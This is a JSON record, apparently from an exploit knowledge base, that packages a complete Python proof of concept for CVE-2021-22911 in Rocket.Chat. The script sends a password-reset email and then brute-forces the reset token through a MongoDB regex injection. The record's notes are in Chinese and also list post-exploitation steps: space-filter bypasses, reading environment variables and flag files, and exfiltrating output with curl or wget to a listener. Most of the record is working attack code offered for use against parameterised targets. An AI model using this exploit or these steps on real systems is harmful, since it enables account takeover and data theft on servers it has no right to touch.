{"id": "awesome-poc:cve-2021-22911", "kind": "poc", "title": "Rocket Chat MongoDB 注入漏洞 CVE-2021-22911", "technique": "injection", "summary": "Web应用漏洞 / CVE-2021-22911。载荷取自 Awesome-POC 的复现段落，已按实例值参数化。", "preconditions": ["目标产品与版本需落在 CVE-2021-22911 的影响范围内（先确认版本，再发载荷）", "载荷中的 {{host}} / {{target_url}} 按实际目标替换"], "target_stack": ["Web应用漏洞", "CVE-2021-22911"], "payload_template": "import sys\nimport time\nimport string\nimport json\nimport requests\n\n\nguess = '-_' + string.digits + string.ascii_letters\nsession = requests.session()\nsession.headers = {\n    'Content-Type': 'application/json',\n}\n\n\ndef reset_password(target: str, email: str):\n    payload = {\n        'msg': 'method',\n        'method': 'sendForgotPasswordEmail',\n        'params': [email],\n    }\n\n    session.post(\n        f'{target}/api/v1/method.callAnon/sendForgotPasswordEmail',\n        json={'message': json.dumps(payload)},\n    )\n    sys.stdout.write(\"[+] Password Reset Email Sent\\n\")\n    sys.stdout.flush()\n\n\ndef inject_token(target: str):\n    payload = {\n        'msg': 'method',\n        'method': 'getPasswordPolicy',\n        'params': [\n            {\n                'token': {'$regex': '^'}\n            }\n        ],\n    }\n    for i in range(43):\n        current = payload['params'][0]['token']['$regex']\n        sys.stdout.write(f'[*] Guess No.{i + 1} character: ')\n        for ch in guess:\n            payload['params'][0]['token']['$regex'] = current + ch\n            response = session.post(\n                f'{target}/api/v1/method.callAnon/getPasswordPolicy',\n                json={'message': json.dumps(payload)},\n            )\n            if b'Meteor.Error' not in response.content:\n                sys.stdout.write(f\"\\n[+] Current token is {payload['params'][0]['token']['$regex'][1:]}\\n\")\n                sys.stdout.flush()\n                break\n            else:\n                sys.stdout.write('.')\n                sys.stdout.flush()\n\n            time.sleep(1.5)\n\n\nif __name__ == '__main__':\n    target = sys.argv[1]\n    reset_password(target, sys.argv[2])\n    inject_token(target)", "verification_method": ["按 payload 原样发送；命中判据是响应出现该 CVE 的预期特征（回显、报错或读到的文件内容）。", "第一次没有预期响应时换下一条载荷，不要在同一句上反复微调。"], "known_failures": ["机制导入，从未在本平台靶机上验证过；版本不符时不会生效。"], "steps": ["确认目标版本在 CVE-2021-22911 影响范围内", "把 payload 中的占位符换成实际目标", "发送并把响应与预期特征比对"], "post_exploitation": ["命令注入先解决回显：`sh -c 'CMD 2>&1 | base64'` 本地解码，或用 `%09`/`${IFS}` 绕空格过滤。", "回显通了立刻 `id`、`printenv`、`ls -la /`、`cat /flag*`，顺序固定，不要先翻目录。", "无回显就外带（curl/wget 到自己的监听）或写文件到 webroot。"], "provenance": {"source_type": "reference-corpus", "source_ref": "awesome-poc", "source_url": "https://github.com/Threekiii/Awesome-POC", "notes": "提取自 Web应用漏洞/Rocket Chat MongoDB 注入漏洞 CVE-2021-22911.md 的复现段落"}, "trust_level": "unverified", "verified_solve": false, "published_at": null}
